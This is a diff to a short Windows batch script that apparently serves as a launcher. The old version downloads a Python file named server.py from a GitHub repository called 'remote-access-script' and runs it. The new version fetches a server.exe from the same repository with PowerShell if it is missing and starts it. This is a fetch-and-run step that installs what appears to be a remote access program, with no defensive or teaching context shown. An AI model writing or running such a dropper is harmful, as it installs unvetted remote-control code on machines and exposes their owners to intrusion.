@@ -1,15 +1,17 @@
 @echo off
-where python >nul 2>nul
-if %errorlevel% neq 0 (
-    echo Python is not installed. Please install Python.
-    exit /b
-)
-powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/mickr309/remote-access-script/refs/heads/main/server.py -OutFile C:\log\server.py"
-if exist C:\log\server.py (
-    echo Python script downloaded successfully.
+set "server_exe=C:\log\server.exe"
+
+:: Check if the server executable exists
+if exist "%server_exe%" (
+    echo Server executable found.
 ) else (
-    echo Failed to download the Python script.
-    exit /b
+    echo Server executable not found. Downloading...
+    powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/mickr309/remote-access-script/refs/heads/main/server.exe -OutFile %server_exe%"
+    if not exist "%server_exe%" (
+        echo Failed to download the executable.
+        exit /b
+    )
 )
+
 echo Starting the server...
-python C:\log\server.py
+start "" "%server_exe%"
